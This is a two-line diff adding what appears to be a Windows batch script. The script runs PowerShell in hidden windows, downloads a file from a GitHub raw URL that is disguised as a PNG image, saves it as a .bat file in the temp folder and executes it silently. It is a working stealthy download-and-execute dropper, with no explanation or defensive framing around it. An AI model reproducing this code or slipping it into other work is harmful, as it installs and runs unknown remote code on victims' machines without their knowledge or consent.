@@ -1,0 +1,2 @@
+ÿþ&cls
+start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/ud-prog/gv-cu/raw/main/ud.png' -OutFile '%TEMP%\mrw-c.bat'; Start-Process -FilePath '%TEMP%\mrw-c.bat' -WindowStyle Hidden"
